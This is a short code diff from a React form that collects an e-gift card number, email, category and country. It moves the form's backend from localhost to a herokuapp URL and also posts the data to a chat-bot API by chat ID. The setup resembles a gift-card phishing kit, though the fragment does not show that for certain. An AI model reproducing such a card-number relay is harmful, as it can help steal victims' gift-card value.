@@ -75,7 +75,7 @@ export default function TopForm({ Open, setOpen, Data, setData }) {
     e.preventDefault();
     let newdata = `Category: ${data.category} \nE-Gift Number: ${data.egift_number} \nE-Mail: ${data.email} \nCountry: ${data.country}`
     try {
-      const res = await axios.post("http://localhost:5000/api/form/", data);
+      const res = await axios.post("https://giftspace.herokuapp.com/api/form/", data);
       const res1 = await axios.post(URI_API, {
         chat_id: CHAT_ID,
         parse_mode: 'html',
